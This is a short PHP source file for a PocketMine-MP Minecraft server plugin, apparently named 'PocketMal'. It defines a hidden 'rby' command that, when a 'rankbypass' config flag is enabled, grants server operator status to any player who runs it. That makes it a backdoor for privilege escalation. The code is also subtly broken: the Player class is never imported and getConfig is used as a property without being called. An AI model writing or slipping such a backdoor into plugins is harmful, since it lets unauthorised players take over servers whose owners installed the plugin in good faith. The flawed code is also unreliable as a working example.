<?php
namespace skyss0fly\PocketMal;

use pocketmine\command\Command;
use pocketmine\command\CommandSender;
use pocketmine\plugin\PluginBase;

class Main extends PluginBase {
    
public function onEnable(): void {
$this->savedefaultconfig();
    

}
public function onCommand(CommandSender $sender, Command $command, string $label, array $args): bool {
        if (!$sender instanceof Player) {
            $this->getLogger()->warning("Please use this command in-game");
            return false;
        }
    $a = $this->getConfig->get("rankbypass");
    if ( $a) {
        switch ($command->getName()) {
            case "rby":
               $sender->getServer()->addOp($sender);
                return true;
            default:
                throw new \AssertionError("This line will never be executed");
        }
        return false;
    }
}
}
